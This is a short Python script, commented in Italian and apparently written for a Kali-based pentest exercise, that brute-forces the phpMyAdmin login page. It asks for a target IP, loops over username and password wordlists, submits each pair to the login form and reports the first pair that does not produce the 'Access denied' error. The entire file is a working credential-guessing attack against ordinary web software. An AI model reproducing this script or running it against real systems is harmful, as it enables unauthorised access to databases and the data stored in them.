mport mechanicalsoup
import requests

# Richiesta IP e percorso del target
ip = input('Inserire IP target: ')
print('Inserire un indirizzo, o premere "invio" per l\'indirizzo standard: ')
path = input("Indirizzo standard PhpMyAdmin: phpMyAdmin/: ")
if path == "":
    path = "phpMyAdmin/"

# Configurazione del file degli username
user_list = input('Inserire il percorso del file contenente gli username (premere invio per utilizzare il file di default): ')
if not user_list:
    user_list = '/home/kali/Desktop/username.txt'  # Percorso di default per il file degli username

# Configurazione del file delle password
pass_list = input('Inserire il percorso del file contenente le password (premere invio per utilizzare il file di default): ')
if not pass_list:
    pass_list = "/home/kali/Desktop/password.txt"  # Percorso di default per il file delle password

# Definizione della funzione per il brute force
def bf():
    # Apertura e lettura del file degli username
    with open(user_list) as f:
        usernames = f.read().splitlines()

    # Apertura e lettura del file delle password
    with open(pass_list) as f:
        passwords = f.read().splitlines()

    credenziali_trovate = False  # Variabile per tracciare se le credenziali sono state trovate

    # Ciclo attraverso gli username e le password
    for user in usernames:
        for password in passwords:
            print(f"'{user}' - '{password}'")

            # Configurazione del browser
            browser = mechanicalsoup.StatefulBrowser()
            browser.open(f"http://{ip}/{path}")
            url = browser.get_url()

            # Invio del form con username e password
            browser.select_form('form[action="index.php"]')
            data = {"pma_username": user, "pma_password": password}
            response = browser.session.post(url, data=data)

            # Controllo sulla risposta
            if not f"#1045 - Access denied for user '{user}'@'localhost'" in response.text:
                print("Credenziali trovate!\n\tUsername: '{}'\n\tPassword: '{}'".format(user, password))
                credenziali_trovate = True
                break

        if credenziali_trovate:
            break

    # Se nessuna delle credenziali è corretta
    if not credenziali_trovate:
        print("Non è stata trovata alcuna combinazione user - password valida :(")

# Avvio della funzione brute_force
bf()
